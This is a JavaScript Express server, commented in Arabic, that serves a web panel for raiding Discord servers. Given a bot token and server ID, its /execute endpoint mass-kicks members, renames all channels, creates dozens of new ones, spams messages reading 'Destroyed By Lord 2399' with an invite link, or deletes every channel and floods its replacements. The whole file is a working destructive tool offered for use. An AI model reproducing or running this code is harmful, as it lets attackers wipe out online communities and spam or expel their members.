const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// تقديم ملف الـ HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // استخدام Intents مباشرة برقم الحزمة الكامل لضمان عدم الخطأ
    const client = new Client({ intents: 3276799 });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        
        if (!guild) {
            return res.status(404).send({ status: '❌ السيرفر غير موجود أو البوت مو فيه' });
        }

        const name = customName || "Lord 2399";
        const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";

        // الرد فوراً على المتصفح عشان ما يعلق ويطلع "خطأ اتصال"
        res.send({ status: '🚀 تم استلام الأمر.. التدمير بدأ في الخلفية!' });

        // تنفيذ العمليات في الخلفية
        if (action.includes('طرد')) {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        if (action.includes('أسماء')) {
            guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
        }

        if (action.includes('رومات')) {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
                }, i * 300);
            }
        }

        if (action.includes('سبام')) {
            guild.channels.cache.forEach(ch => {
                if (ch.type === ChannelType.GuildText) {
                    for (let i = 0; i < 30; i++) {
                        setTimeout(() => ch.send(msg).catch(() => {}), i * 1000);
                    }
                }
            });
        }

        if (action.includes('التدمير')) {
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 800);
                    }).catch(() => {});
                }, i * 400);
            }
        }

    } catch (e) {
        console.error(e);
        if (!res.headersSent) res.status(500).send({ status: '❌ التوكن غلط' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server running on port ' + PORT));
